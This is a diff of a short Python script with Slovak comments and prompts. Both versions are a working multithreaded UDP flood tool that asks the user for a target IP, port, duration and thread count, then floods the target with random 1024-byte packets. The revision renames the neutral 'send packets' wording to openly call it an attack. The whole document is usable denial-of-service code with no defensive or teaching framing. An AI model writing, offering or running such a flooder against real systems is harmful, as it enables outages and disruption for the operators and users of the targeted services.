@@ -1,40 +1,46 @@
 import socket
 import threading
-import os
 import time
+import os
 
-# Vyčistenie obrazovky
-os.system("clear" if os.name == "posix" else "cls")
+# Vyčistenie konzoly
+os.system("cls")
 
-def send_packets(ip_address, port, duration):
-    """Funkcia na odosielanie UDP packetov po dobu 'duration' sekúnd."""
-    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    end_time = time.time() + duration
-    packet = os.urandom(1024)  # Náhodné dáta veľkosti 1024 bajtov
-    while time.time() < end_time:
+def udp_flood(target_ip, target_port, duration):
+    """
+    Funkcia na vykonanie UDP Flood na cieľové zariadenie.
+    :param target_ip: IP adresa cieľa.
+    :param target_port: Port cieľa.
+    :param duration: Dĺžka útoku v sekundách.
+    """
+    timeout = time.time() + duration
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    packet = os.urandom(1024)  # Náhodný obsah packetu veľkosti 1024 bajtov
+
+    print(f"Začiatok UDP Flood na {target_ip}:{target_port} po dobu {duration} sekúnd...")
+    while time.time() < timeout:
         try:
-            udp_socket.sendto(packet, (ip_address, port))
+            sock.sendto(packet, (target_ip, target_port))
         except Exception as e:
-            print(f"Chyba pri odosielaní: {e}")
+            print(f"Chyba: {e}")
             break
-    udp_socket.close()
+    sock.close()
 
 # Vstupy od používateľa
-ip_address = input("Zadaj cieľovú IP adresu: ")
-port = int(input("Zadaj cieľový port: "))
-duration = int(input("Zadaj dobu odosielania packetov (v sekundách): "))
-thread_count = int(input("Zadaj počet vlákien: "))
+target_ip = input("Zadajte IP adresu cieľa: ")
+target_port = int(input("Zadajte port cieľa: "))
+duration = int(input("Zadajte dĺžku útoku (v sekundách): "))
+threads_count = int(input("Zadajte počet vlákien: "))
 
-# Spustenie threadov
+# Spustenie UDP Flood vo viacerých vláknach
 threads = []
-print(f"Začiatok odosielania packetov na {ip_address}:{port} po dobu {duration} sekúnd...")
-for i in range(thread_count):
-    thread = threading.Thread(target=send_packets, args=(ip_address, port, duration))
+for i in range(threads_count):
+    thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
     threads.append(thread)
     thread.start()
 
-# Počkáme, kým všetky vlákna skončia
+# Počkáme na dokončenie všetkých vláken
 for thread in threads:
     thread.join()
 
-print("Odosielanie dokončené.")
+print("UDP Flood dokončený.")
